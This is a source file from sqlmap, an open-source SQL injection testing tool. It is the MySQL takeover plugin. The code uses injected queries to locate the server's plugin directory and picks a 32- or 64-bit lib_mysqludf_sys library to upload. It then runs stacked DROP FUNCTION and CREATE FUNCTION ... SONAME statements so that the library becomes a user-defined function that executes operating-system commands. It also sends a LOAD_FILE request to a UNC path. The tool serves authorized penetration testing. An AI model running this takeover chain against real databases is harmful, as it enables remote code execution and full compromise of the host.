#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import isTechniqueAvailable
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import PAYLOAD
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def __init__(self):
        self.__basedir = None
        self.__datadir = None

        GenericTakeover.__init__(self)

    def udfSetRemotePath(self):
        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
        if banVer >= "5.1.19":
            if self.__basedir is None:
                logger.info("retrieving MySQL base directory absolute path")

                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
                self.__basedir = inject.getValue("SELECT @@basedir")

                if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
                    kb.os = "Windows"
                else:
                    kb.os = "Linux"

            # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
            if kb.os == "Windows":
                self.__basedir += "/lib/plugin"
            else:
                self.__basedir += "/lib/mysql/plugin"

            self.__basedir = ntToPosixSlashes(normalizePath(self.__basedir))
            self.udfRemoteFile = "%s/%s.%s" % (self.__basedir, self.udfSharedLibName, self.udfSharedLibExt)

        # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
        # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
        else:
            #logger.debug("retrieving MySQL data directory absolute path")

            # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
            #self.__datadir = inject.getValue("SELECT @@datadir")

            # NOTE: specifying the relative path as './udf.dll'
            # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
            self.__datadir = "."
            self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))

            # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
            # C:\WINDOWS\system32, @@basedir\bin or @@datadir
            self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        msg = "what is the back-end database management system architecture?"
        msg += "\n[1] 32-bit (default)"
        msg += "\n[2] 64-bit"

        while True:
            arch = readInput(msg, default='1')

            if isinstance(arch, basestring) and arch.isdigit() and int(arch) in ( 1, 2 ):
                if int(arch) == 1:
                    arch = 32
                else:
                    arch = 64

                break
            else:
                warnMsg = "invalid value, valid values are 1 and 2"
                logger.warn(warnMsg)

        if kb.os == "Windows":
            self.udfLocalFile   += "/mysql/windows/%d/lib_mysqludf_sys.dll" % arch
            self.udfSharedLibExt = "dll"
        else:
            self.udfLocalFile   += "/mysql/linux/%d/lib_mysqludf_sys.so" % arch
            self.udfSharedLibExt = "so"

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info("creating UDF '%s' from the binary UDF file" % udf)

            ret = inpRet["return"]

            # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
            inject.goStacked("DROP FUNCTION %s" % udf)
            inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, ret, self.udfSharedLibName, self.udfSharedLibExt))

            self.createdUdf.add(udf)
        else:
            logger.debug("keeping existing UDF '%s' as requested" % udf)

    def uncPathRequest(self):
        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            query   = agent.prefixQuery("AND LOAD_FILE('%s')" % self.uncPath)
            query   = agent.suffixQuery(query)
            payload = agent.payload(newValue=query)

            Request.queryPage(payload)
        else:
            inject.goStacked("SELECT LOAD_FILE('%s')" % self.uncPath, silent=True)
